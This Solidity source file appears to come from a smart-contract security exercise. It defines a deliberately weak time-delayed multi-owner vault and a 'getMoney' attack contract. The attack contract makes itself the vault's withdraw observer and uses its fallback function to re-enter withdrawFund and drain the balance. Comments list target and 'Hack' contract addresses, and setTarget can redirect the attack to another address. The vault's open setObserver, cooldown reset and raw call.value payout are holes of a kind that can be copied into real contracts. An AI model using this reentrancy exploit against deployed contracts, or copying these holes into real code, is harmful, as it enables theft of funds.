pragma solidity ^0.4.17;
//老董最新合约：0x0e3e24d6f30cd710599d75e7e0d5448d74ae4bdb
//Hack合约：0xe359bdc5c9d7f39ccbe26a9a2ca5e0b9091e0c46
//observe:0x97ddbd0ade30554e05e7b4545db3188b62696178
//一个测试的老董合约：0x2b44b4ab8f15dc9d77f14a9daf6bb797ecce1cb3
contract BasicMultiOwnerVault {
    address[] public authorizedUsers;
    address public owner;
    address public withdrawObserver;
    address public additionalAuthorizedContract;
    address public proposedAAA;
    uint public lastUpdated;
    bool[] public votes;
    address [] public observerHistory;

    modifier onlyAuthorized() {
        bool pass = false;
        if(additionalAuthorizedContract == msg.sender) {
            pass = true;
        }
        
        for (uint i = 0; i < authorizedUsers.length; i++) {
            if(authorizedUsers [i] == msg.sender) {
                pass = true;
                break;
            }
        }
        require (pass);
        _;
    }
    
    modifier onlyOnce() {
        require(owner == 0x0);
        _;
    }
    
    modifier onlyOwner() {
        require(msg.sender == owner);
        _;
    }
    
    modifier recordAction() {
        lastUpdated = now;
        _;
    }
    
    function initilizeVault() recordAction onlyOnce {
        owner = msg.sender;
    }
    
    function setObserver(address ob) {
        bool duplicate = false;
        for (uint i = 0; i < observerHistory.length; i++) {
            if (observerHistory[i] == ob) {
                duplicate = true;
            }
        }
        
        if (!duplicate) {
            withdrawObserver = ob;
            observerHistory.push(ob);
        }
    }
    
    function addToReserve() payable recordAction external returns (uint) {
        assert(msg.value > 0.01 ether);
        return this.balance;
    }
    
    function basicWithdraw(address dst) internal returns (bool) {
        require(this.balance >= 0.001 ether);
        bool res = dst.call.value(0.001 ether)();
        return res;
    }
    
    function checkAllVote() private returns (bool) {
        for(uint i = 0; i < votes.length; i++) {
            if(!votes[i]) {
                return false;
            }
        }
        
        return true;
    }
    
    function clearVote() private {
        for(uint i = 0; i < votes.length; i++) {
            votes[i] = false;
        }
    }

    function addAuthorizedAccount(uint votePosition, address proposal) onlyAuthorized external {
        require(votePosition < authorizedUsers.length);
        require(msg.sender == authorizedUsers[votePosition]);
        if (proposal != proposedAAA) {
            clearVote();
            proposedAAA = proposal;
        }
        
        votes[votePosition] = true;
        if (checkAllVote()) {
            additionalAuthorizedContract = proposedAAA;
            clearVote();
        }
    }
    
    function resolve() onlyOwner {
        if(now >= lastUpdated + 12 hours) {
            selfdestruct(owner);
        }
    }

}

contract TimeDelayedVault is BasicMultiOwnerVault {
    uint  public nextWithdrawTime;
    uint  public withdrawCoolDownTime;
    
    function TimeDelayedVault() recordAction {
        nextWithdrawTime = now;
        withdrawCoolDownTime = 2 hours;
        //this.call(bytes4(sha3("initializeVault()")));
       
        // Please note, the following code chunk is different for each group, all group members are added to authorizedUsers array
        authorizedUsers.push(0xca35b7d915458ef540ade6068dfe2f44e8fa733c); //second
        //authorizedUsers.push(0x14723a09acff6d2a60dcdf7aa4aff308fddc160c);//third
        //authorizedUsers.push(0xeb557D1A1c81a18D435cd7c882f20D24ED6E9dd3); //metamask ropsten

        for(uint i=0; i<authorizedUsers.length; i++) {
            votes.push(false);
        }
    }
    
    function withdrawFund(address dst) onlyAuthorized external returns (bool) {
        require(now > nextWithdrawTime);
        assert(withdrawObserver.call(bytes4(sha3("observe()"))));
        bool res = basicWithdraw(dst);
        nextWithdrawTime = nextWithdrawTime + withdrawCoolDownTime;
        return res;
    }
    function theBalance () returns (uint){
        return this.balance;
    }
    function refreshWithdrawTime() {
        nextWithdrawTime = now;
    }
}


contract getMoney{
    address public ct_addr = 0x2b44b4ab8f15dc9d77f14a9daf6bb797ecce1cb3;
    uint public count = 0;
    uint public limit = 1;
    uint public gaslimit = 30000000;
    address public ownerLALALA;
    TimeDelayedVault ct = TimeDelayedVault(ct_addr);
    
    modifier onlyOwner() {
        require(msg.sender == ownerLALALA);
        _;
    }
    function getMoney(){
        ownerLALALA = msg.sender;
    }
    function setGas(uint _gas) onlyOwner{
        gaslimit = _gas;
    }
    function setTarget(address _addr) onlyOwner{
        ct_addr = _addr;
    }
    function addObserver() onlyOwner{
       ct.setObserver(this);    
    }
    function hack() onlyOwner{ // need checkObserver first
         count += 1;
         ct.withdrawFund(this);
    }
    function hack2() onlyOwner{ // need checkObserver first
         ct.setObserver(this);
         count += 1;

         ct.withdrawFund(this);
    }    
    function () payable {
        if(count<limit ){
            count += 1;
            //ct.withdrawFund.gas(gaslimit)(this);
            ct.withdrawFund(this);
        }else{
            count = 0;
        }
    }
    function theBalance () onlyOwner returns (uint _balance){
        return this.balance;
    }
    function setLimit(uint _limit) onlyOwner returns (uint) {
        limit = _limit;
        return limit;
    }
    function observe() returns (bool){
        return true;
    }
    
}


contract test2{//not throw error 0x97ddbd0ade30554e05e7b4545db3188b62696178
    function observe() returns (bool){
        return true;
    }
}
